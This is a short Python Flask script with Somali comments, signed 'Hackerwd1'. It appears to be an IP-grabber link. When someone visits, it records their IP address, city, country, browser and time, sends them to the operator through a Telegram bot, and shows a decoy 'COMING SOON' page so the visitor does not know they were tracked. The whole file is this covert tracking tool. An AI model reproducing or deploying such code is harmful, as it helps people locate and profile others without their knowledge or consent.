from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

# ✅ Telegram bot settings
BOT_TOKEN = "xagaan bot token ka gasho"
CHAT_ID = "xagaana ID chat ka "

# ✅ Hel IP-ga saxda ah (xitaa marka laga yimaado ngrok, proxy, iwm)
def get_visitor_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers['X-Forwarded-For'].split(',')[0]
    else:
        ip = request.remote_addr
    return ip

# ✅ Hel wadan + magaalo ka imanaya IP-ga
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        return data.get("country", "Unknown"), data.get("city", "Unknown")
    except:
        return "Unknown", "Unknown"

# ✅ U dir fariin Telegram
def send_telegram_message(ip, country, city, user_agent, time_utc):
    message = (
        "📥 *Visitor Info:*\n"
        f"📡 IP: `{ip}`\n"
        f"🌍 Country: `{country}`\n"
        f"🏙️ City: `{city}`\n"
        f"🌐 Browser: `{user_agent}`\n"
        f"⏰ Time: `{time_utc}`\n"
        f"💻/📱 Device info: `{user_agent}`\n\n"
        f"_By dev Hackerwd1 🎃_"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=data)
    print("Telegram response:", response.text)

# ✅ Flask route
@app.route('/')
def track_ip():
    user_ip = get_visitor_ip()
    user_agent = request.headers.get('User-Agent')
    time_utc = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    country, city = get_ip_info(user_ip)
    send_telegram_message(user_ip, country, city, user_agent, time_utc)

    return "📡 COMING SOON WELCOME "

# ✅ Run Flask server
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=4500)
